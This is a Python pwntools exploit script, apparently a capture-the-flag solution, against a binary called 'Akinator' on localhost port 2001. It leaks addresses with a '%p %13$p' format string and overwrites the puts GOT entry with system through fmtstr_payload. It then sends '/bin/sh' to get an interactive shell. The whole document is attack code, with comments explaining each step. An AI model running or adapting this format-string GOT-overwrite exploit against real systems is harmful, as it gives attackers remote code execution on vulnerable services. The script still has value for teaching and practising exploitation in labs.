from pwn import *

# Define the offsets between the addresses of the functions in the debugger
# and the addresses of the functions in the binary. These offsets are calculated
# based on the difference between the addresses of the functions in the debugger
# and the leaked addresses of the same functions from the binary.

# Address of the system function in the debugger
systemDbgAddr = 0x7f85ad0b3d70 

# Leaked address to calculate the system function address
leakedAddrToGetSystem = 0x7f85ad0f13f5

# Calculate the difference (offset) between the addresses of the system function
systemdiff = systemDbgAddr - leakedAddrToGetSystem

# Address of the put function in the debugger
putAddrDbg = 0x55c78376c000

# Leaked address to calculate the put function address
leakedAddrToGetput = 0x55c78376a008

# Calculate the difference (offset) between the addresses of the put function
putDiff = putAddrDbg - leakedAddrToGetput

# Start a process or a remote connection to the binary 'Akinator'
# Uncomment the appropriate line for either a local process or a remote connection
# p = process('./Akinator')
p = remote('localhost', 2001)

# Set the binary context for pwntools
context.binary = ELF('./Akinator')
context.arch = 'amd64'

# Receive data until the prompt appears
p.recvuntil(': ')

# Send an initial format string to leak an address
p.sendline('%p %13$p')

# Receive the line containing the leaks and decode it
allLeaks = p.recvline().decode().strip()
leaks = allLeaks.split(' ')

# Extract the specific leaks needed
toGetputGot = int(leaks[14], 16)
togetSystemLeak = int(leaks[15], 16)

# Log the leaked address to get the system function
log.info('togetSystemLeak: ' + hex(togetSystemLeak))

# Calculate the actual system function address using the offset
systemAddr = togetSystemLeak + systemdiff 
log.info('systemAddr: ' + hex(systemAddr))

# Log the leaked address to get the put function GOT entry
log.info('toGetputGot: ' + hex(toGetputGot))


# Calculate the actual put function GOT entry address using the offset
putGot = toGetputGot + putDiff
log.info('putGot: ' + hex(putGot))

# Receive data until the next prompt
p.recvuntil('(y/n)')
p.sendline('y')
p.recvuntil(': ')

# Create the format string payload to overwrite the GOT entry for the put function
fmt = fmtstr_payload(6, {putGot: systemAddr}, write_size='short')

# Send the format string payload
p.sendline(fmt)

# Receive data until the next prompt and respond with 'y' to enter '/bin/sh'
p.recvuntil('(y/n)')
p.sendline('y')
p.recvuntil(': ')

# Send the command to open a shell
p.sendline('/bin/sh')

# Receive data until the next prompt and respond with 'n' to make program use put that will call system after changing the GOT entry
p.recvuntil('(y/n)')
p.sendline('n')

# Interact with the shell
p.interactive()
